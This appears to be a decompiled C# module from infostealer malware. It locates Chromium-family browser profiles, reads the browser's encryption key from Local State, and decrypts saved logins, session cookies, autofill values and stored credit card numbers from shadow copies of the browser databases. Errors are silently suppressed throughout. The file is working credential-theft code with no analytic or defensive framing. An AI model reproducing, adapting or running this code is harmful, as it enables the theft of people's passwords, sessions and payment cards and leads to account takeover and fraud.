using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;

// Token: 0x02000002 RID: 2
public static class Chr_0_M_e
{
	// Token: 0x06000001 RID: 1 RVA: 0x000043AC File Offset: 0x000025AC
	public static List<Browser> Scan(IList<string> profiles)
	{
		List<Browser> list = new List<Browser>();
		try
		{
			foreach (string baseDirectory in from x in profiles
			select Environment.ExpandEnvironmentVariables(x))
			{
				foreach (string text in FileCopier.FindPaths(baseDirectory, 1, 1, new string[]
				{
					"Login Data",
					"Web Data",
					"Cookies"
				}))
				{
					Browser browser = new Browser();
					string dataFolder = string.Empty;
					string text2 = string.Empty;
					try
					{
						dataFolder = new FileInfo(text).Directory.FullName;
						if (dataFolder.Contains("Opera GX Stable"))
						{
							text2 = "Opera GX";
						}
						else
						{
							text2 = (text.Contains("AppData\\Roaming\\") ? FileCopier.ChromeGetRoamingName(dataFolder) : FileCopier.ChromeGetLocalName(dataFolder));
						}
						if (!string.IsNullOrEmpty(text2))
						{
							text2 = text2[0].ToString().ToUpper() + text2.Remove(0, 1);
							string text3 = FileCopier.ChromeGetName(dataFolder);
							if (!string.IsNullOrEmpty(text3))
							{
								browser.BrowserName = text2;
								browser.BrowserProfile = text3;
								browser.Logins = Chr_0_M_e.MakeTries<List<Account>>(() => Chr_0_M_e.ScanPasswords(dataFolder), (List<Account> x) => x.Count > 0);
								browser.Cookies = Chr_0_M_e.MakeTries<List<ScannedCookie>>(() => Chr_0_M_e.ScanCook(dataFolder), (List<ScannedCookie> x) => x.Count > 0);
								browser.Autofills = Chr_0_M_e.MakeTries<List<Autofill>>(() => Chr_0_M_e.ScanFills(dataFolder), (List<Autofill> x) => x.Count > 0);
								browser.CC = Chr_0_M_e.MakeTries<List<CC>>(() => Chr_0_M_e.ScanCC(dataFolder), (List<CC> x) => x.Count > 0);
							}
						}
					}
					catch (Exception)
					{
					}
					if (!browser.IsEmpty())
					{
						list.Add(browser);
					}
				}
			}
		}
		catch
		{
		}
		return list;
	}

	// Token: 0x06000002 RID: 2 RVA: 0x000046BC File Offset: 0x000028BC
	private static List<Account> ScanPasswords(string profilePath)
	{
		List<Account> list = new List<Account>();
		try
		{
			string text = Path.Combine(profilePath, "Login Data");
			if (!File.Exists(text))
			{
				return list;
			}
			string chromeKey = Chr_0_M_e.ReadKey(profilePath);
			using (FileCopier fileCopier = new FileCopier())
			{
				try
				{
					DbFactory dbFactory = new DbFactory(fileCopier.CreateShadowCopy(text));
					dbFactory.ReadContextTable("logins");
					for (int i = 0; i < dbFactory.RowLength; i++)
					{
						Account account = new Account();
						try
						{
							account.URL = dbFactory.ReadContextValue(i, 0).Trim();
							account.Username = dbFactory.ReadContextValue(i, 3).Trim();
							account.Password = Chr_0_M_e.DecryptChromium(dbFactory.ReadContextValue(i, 5), chromeKey);
						}
						catch (Exception)
						{
						}
						finally
						{
							account.URL = (string.IsNullOrWhiteSpace(account.URL) ? "UNKNOWN" : account.URL);
							account.Username = (string.IsNullOrWhiteSpace(account.Username) ? "UNKNOWN" : account.Username);
							account.Password = (string.IsNullOrWhiteSpace(account.Password) ? "UNKNOWN" : account.Password);
						}
						if (account.Password != "UNKNOWN")
						{
							list.Add(account);
						}
					}
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		return list;
	}

	// Token: 0x06000003 RID: 3 RVA: 0x000048A8 File Offset: 0x00002AA8
	private static List<ScannedCookie> ScanCook(string profilePath)
	{
		List<ScannedCookie> list = new List<ScannedCookie>();
		try
		{
			string text = Path.Combine(profilePath, "Cookies");
			if (!File.Exists(text))
			{
				return list;
			}
			string chromeKey = Chr_0_M_e.ReadKey(profilePath);
			using (FileCopier fileCopier = new FileCopier())
			{
				try
				{
					DbFactory dbFactory = new DbFactory(fileCopier.CreateShadowCopy(text));
					dbFactory.ReadContextTable("cookies");
					for (int i = 0; i < dbFactory.RowLength; i++)
					{
						ScannedCookie scannedCookie = null;
						try
						{
							scannedCookie = new ScannedCookie
							{
								Host = dbFactory.GatherValue(i, "host_key").Trim(),
								Http = dbFactory.GatherValue(i, "host_key").Trim().StartsWith("."),
								Path = dbFactory.GatherValue(i, "path").Trim(),
								Secure = dbFactory.GatherValue(i, "is_secure").Contains("1"),
								Expires = Convert.ToInt64(dbFactory.GatherValue(i, "expires_utc").Trim()) / 1000000L - 11644473600L,
								Name = dbFactory.GatherValue(i, "name").Trim(),
								Value = Chr_0_M_e.DecryptChromium(dbFactory.GatherValue(i, "encrypted_value"), chromeKey)
							};
							if (scannedCookie.Expires < 0L)
							{
								scannedCookie.Expires = DateTime.Now.AddMonths(12).Ticks - 621355968000000000L;
							}
						}
						catch
						{
						}
						if (!string.IsNullOrWhiteSpace((scannedCookie != null) ? scannedCookie.Value : null))
						{
							list.Add(scannedCookie);
						}
					}
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		return list;
	}

	// Token: 0x06000004 RID: 4 RVA: 0x00004B0C File Offset: 0x00002D0C
	private static List<Autofill> ScanFills(string profilePath)
	{
		List<Autofill> list = new List<Autofill>();
		try
		{
			string text = Path.Combine(profilePath, "Web Data");
			if (!File.Exists(text))
			{
				return list;
			}
			string chromeKey = Chr_0_M_e.ReadKey(profilePath);
			using (FileCopier fileCopier = new FileCopier())
			{
				try
				{
					DbFactory dbFactory = new DbFactory(fileCopier.CreateShadowCopy(text));
					dbFactory.ReadContextTable("autofill");
					for (int i = 0; i < dbFactory.RowLength; i++)
					{
						Autofill autofill = null;
						try
						{
							string text2 = dbFactory.GatherValue(i, "value").Trim();
							if (text2.StartsWith("v10") || text2.StartsWith("v11"))
							{
								text2 = Chr_0_M_e.DecryptChromium(text2, chromeKey);
							}
							autofill = new Autofill
							{
								Name = dbFactory.GatherValue(i, "name").Trim(),
								Value = text2
							};
						}
						catch
						{
						}
						if (autofill != null)
						{
							list.Add(autofill);
						}
					}
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		return list;
	}

	// Token: 0x06000005 RID: 5 RVA: 0x00004C9C File Offset: 0x00002E9C
	private static List<CC> ScanCC(string profilePath)
	{
		List<CC> list = new List<CC>();
		try
		{
			string text = Path.Combine(profilePath, "Web Data");
			if (!File.Exists(text))
			{
				return list;
			}
			string chromeKey = Chr_0_M_e.ReadKey(profilePath);
			using (FileCopier fileCopier = new FileCopier())
			{
				try
				{
					DbFactory dbFactory = new DbFactory(fileCopier.CreateShadowCopy(text));
					dbFactory.ReadContextTable("credit_cards");
					for (int i = 0; i < dbFactory.RowLength; i++)
					{
						CC cc = null;
						try
						{
							string number = Chr_0_M_e.DecryptChromium(dbFactory.GatherValue(i, "card_number_encrypted"), chromeKey).Replace(" ", string.Empty);
							cc = new CC
							{
								HolderName = dbFactory.GatherValue(i, "name_on_card").Trim(),
								Month = Convert.ToInt32(dbFactory.GatherValue(i, "expiration_month").Trim()),
								Year = Convert.ToInt32(dbFactory.GatherValue(i, "expiration_year").Trim()),
								Number = number
							};
						}
						catch
						{
						}
						if (cc != null)
						{
							list.Add(cc);
						}
					}
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		return list;
	}

	// Token: 0x06000006 RID: 6 RVA: 0x00004E58 File Offset: 0x00003058
	private static string DecryptChromium(string chiperText, string chromeKey)
	{
		string result = string.Empty;
		try
		{
			if (chiperText[0] == 'v' && chiperText[1] == '1')
			{
				result = CryptoProvider.Decrypt(Convert.FromBase64String(chromeKey), chiperText);
			}
			else
			{
				result = CryptoHelper.DecryptBlob(chiperText, DataProtectionScope.CurrentUser, null).Trim();
			}
		}
		catch (Exception)
		{
		}
		return result;
	}

	// Token: 0x06000007 RID: 7 RVA: 0x00004EB4 File Offset: 0x000030B4
	public static T MakeTries<T>(Func<T> func, Func<T, bool> success)
	{
		int num = 1;
		T t = func();
		while (!success(t))
		{
			t = func();
			num++;
			if (num > 2)
			{
				return t;
			}
		}
		return t;
	}

	// Token: 0x06000008 RID: 8 RVA: 0x00004EE8 File Offset: 0x000030E8
	private static string ReadKey(string profilePath)
	{
		string result = string.Empty;
		string empty = string.Empty;
		try
		{
			string[] array = profilePath.Split(new string[1] { "\\" }, StringSplitOptions.RemoveEmptyEntries);
			array = array.Take(array.Length - 1).ToArray();
			int num = 0;
			while (true)
			{
				switch (num)
				{
				default:
					continue;
				case 0:
					empty = Path.Combine(string.Join("\\", array), "Local State");
					if (!File.Exists(empty))
					{
						num++;
						continue;
					}
					break;
				case 1:
					empty = Path.Combine(profilePath, "Local State");
					if (!File.Exists(empty))
					{
						num++;
						continue;
					}
					break;
				case 2:
					empty = Path.Combine(string.Join("\\", array), "LocalPrefs.json");
					if (!File.Exists(empty))
					{
						num++;
						continue;
					}
					break;
				case 3:
					empty = Path.Combine(profilePath, "LocalPrefs.json");
					break;
				}
				break;
			}
			if (File.Exists(empty))
			{
				try
				{
					using (new FileCopier())
					{
						result = File.ReadAllText(empty).FromJSON<LocalState>().os_crypt.encrypted_key;
						return result;
					}
				}
				catch (Exception)
				{
					return result;
				}
			}
			return result;
		}
		catch
		{
			return result;
		}
	}
}
